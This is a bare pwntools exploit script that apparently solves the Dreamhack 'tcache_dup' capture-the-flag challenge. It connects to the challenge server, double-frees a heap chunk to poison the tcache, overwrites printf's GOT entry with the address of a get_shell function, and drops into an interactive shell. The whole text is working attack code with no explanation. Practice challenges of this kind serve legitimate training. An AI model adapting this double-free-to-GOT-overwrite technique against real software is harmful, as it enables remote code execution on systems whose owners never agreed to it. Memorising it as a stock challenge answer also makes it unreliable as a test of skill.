#0x0000000000400970  create
#0x0000000000400a3a  delete
#0x0000000000400ab0  get_shell
#0x0000000000400ac1  main


from pwn import *

p = remote("host3.dreamhack.games", 13941)
elf = ELF("./tcache_dup")
get_shell = elf.symbols['get_shell']

def create(size, data):
    p.sendlineafter(">", '1')
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))

create(8, 'A' * 8)

delete(0)
delete(0)

create(8, p64(elf.got['printf']))
create(8, 'A' * 8)

create(8, p64(get_shell))

p.interactive()


